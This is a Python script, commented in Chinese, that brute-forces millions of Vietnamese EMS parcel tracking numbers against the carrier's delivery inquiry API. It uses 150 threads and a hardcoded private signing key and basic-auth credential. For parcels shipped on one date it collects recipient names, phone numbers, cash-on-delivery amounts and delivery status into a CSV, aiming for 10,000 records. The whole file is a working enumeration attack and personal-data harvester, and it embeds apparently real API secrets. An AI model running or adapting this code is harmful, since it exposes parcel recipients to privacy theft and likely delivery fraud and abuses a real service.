#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
智能扫描10000订单 - 基于已知成功区域优化
从之前的扫描我们知道：
- EP系列在492-493M范围有订单
- 成功率约0.3%（包括已配送+未配送）
- 要找10000个订单，需要扫描约330万个号
"""
import hashlib, requests, json, time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading, sys

API_URL = "https://api-dingdong.ems.com.vn/"
PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
BASIC_AUTH = "bG90dG5ldDpkbXM="

TARGET_DATE = "15/10/2025"
print_lock = threading.Lock()
state = {'found': 0, 'tested': 0, 'lock': threading.Lock(), 'start_time': time.time(), 'last_print': 0}
TARGET = 10000

csv_file = f"smart_10k_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
csv_lock = threading.Lock()

def init_csv():
    with open(csv_file, 'w', encoding='utf-8-sig') as f:
        f.write('运单号,发件日期,装载日期,配送日期,收件人,收件电话,COD金额,状态,是否已配送,发现时间\n')

def save_order(tracking, issue, load, delivery, receiver, phone, cod, status, is_delivered):
    with csv_lock:
        try:
            with open(csv_file, 'a', encoding='utf-8-sig') as f:
                # CSV格式化
                receiver = str(receiver).replace('"', '""').replace(',', ' ')
                status = str(status).replace('"', '""').replace(',', ' ')
                f.write(f'"{tracking}","{issue}","{load}","{delivery}","{receiver}","{phone}",{cod},"{status}","{is_delivered}","{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}"\n')
                f.flush()
        except Exception as e:
            pass

def sign(text):
    return hashlib.sha256((text + PRIVATE_KEY).encode()).hexdigest().upper()

def safe_print(msg):
    with print_lock:
        print(msg, flush=True)
        sys.stdout.flush()

def is_today(date_str):
    if not date_str:
        return False
    return ("15/10/2025" in str(date_str) or "10/15/2025" in str(date_str))

def check_order(tracking):
    if state['found'] >= TARGET:
        return None
    
    try:
        with state['lock']:
            state['tested'] += 1
            tested_count = state['tested']
        
        sig = sign(tracking)
        headers = {
            "Authorization": f"Basic {BASIC_AUTH}",
            "APIKey": PRIVATE_KEY,
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        r = requests.post(
            f"{API_URL}api/Delivery/Inquiry",
            headers=headers,
            data={"ParcelCode": tracking, "Signature": sig},
            timeout=6
        )
        
        if r.status_code == 200:
            data = r.json()
            if data.get('Code') == '00' and data.get('Value'):
                v = data['Value']
                issue = v.get('IssueDate', '')
                load = v.get('LoadDate', '')
                
                if is_today(issue) or is_today(load):
                    with state['lock']:
                        state['found'] += 1
                        count = state['found']
                    
                    delivery = v.get('DeliveryDate', '')
                    receiver = v.get('ReceiverName', '')[:20]
                    phone = v.get('ReceiverPhone', '')
                    cod = v.get('CollectAmount', 0)
                    status = v.get('StatusName', '')[:15]
                    is_delivered = "已配送" if delivery else "未配送"
                    
                    elapsed = time.time() - state['start_time']
                    speed = state['tested'] / elapsed if elapsed > 0 else 0
                    
                    safe_print(f"✅ [{count:,}/{TARGET:,}] {tracking} | {is_delivered} | {receiver} | {cod:,}₫ | {speed:.0f}/s")
                    save_order(tracking, issue, load, delivery, receiver, phone, cod, status, is_delivered)
                    return True
        
        # 每100个输出进度
        if tested_count % 100 == 0:
            with state['lock']:
                current_time = time.time()
                if current_time - state['last_print'] >= 5:  # 至少间隔5秒
                    state['last_print'] = current_time
                    elapsed = current_time - state['start_time']
                    speed = state['tested'] / elapsed if elapsed > 0 else 0
                    progress = (state['found'] / TARGET * 100)
                    safe_print(f"📊 已扫{state['tested']:,} | 找到{state['found']:,} ({progress:.1f}%) | {speed:.0f}/s")
    except:
        pass
    return False

# 🎯 智能扫描范围 - 基于已知成功区域
# EP 490-495M 全扫（500万号）
# EF 40-50M 全扫（1000万号）
RANGES = [
    # EP系列 - 核心区域密集扫描
    ('EP', 490000000, 495000000, 1),   # 500万号，步长1
    
    # EF系列 - 扩大范围
    ('EF', 40000000, 50000000, 1),     # 1000万号，步长1
    
    # ED/EB/EC系列 - 采样
    ('ED', 40000000, 50000000, 10),    # 100万点
    ('EB', 40000000, 50000000, 10),    # 100万点  
    ('EC', 40000000, 50000000, 10),    # 100万点
]

print(f"""
╔═══════════════════════════════════════════════════════════╗
║   🎯 智能扫描 - 目标{TARGET:,}个当天订单            ║
╚═══════════════════════════════════════════════════════════╝

📊 扫描策略（基于已知成功区域）:
  🔵 EP: 490M-495M (500万号，步长1)
  🟢 EF: 40M-50M (1000万号，步长1)
  🟡 ED/EB/EC: 40M-50M (各100万点，采样)
  
  总计: 约1800万号段

⚡ 配置:
  线程: 150
  日期: {TARGET_DATE}
  目标: {TARGET:,}订单
  预计成功率: 0.3%
  预计耗时: 4-6小时

🚀 开始智能扫描...
""")

init_csv()
start_time = time.time()

try:
    with ThreadPoolExecutor(max_workers=150) as executor:
        futures = []
        
        print("正在提交任务...")
        for prefix, start, end, step in RANGES:
            if state['found'] >= TARGET:
                break
            for num in range(start, end, step):
                if state['found'] >= TARGET:
                    break
                tracking = f"{prefix}{num:09d}VN"
                futures.append(executor.submit(check_order, tracking))
        
        print(f"已提交 {len(futures):,} 个任务，开始执行...\n")
        
        for future in as_completed(futures):
            try:
                future.result()
            except:
                pass
            
            if state['found'] >= TARGET:
                safe_print(f"\n🎉 已达到目标{TARGET:,}个订单！停止扫描...\n")
                break

except KeyboardInterrupt:
    safe_print("\n\n⚠️  用户中断扫描\n")

elapsed = time.time() - start_time
safe_print(f"""
{'='*70}
🎉 扫描完成！
{'='*70}
找到订单: {state['found']:,} 个
已测试: {state['tested']:,} 个号
成功率: {state['found']/state['tested']*100:.3f}%
耗时: {elapsed/3600:.2f} 小时 ({elapsed/60:.1f} 分钟)
速度: {state['tested']/elapsed:.0f} 次/秒
输出文件: {csv_file}
{'='*70}
""")
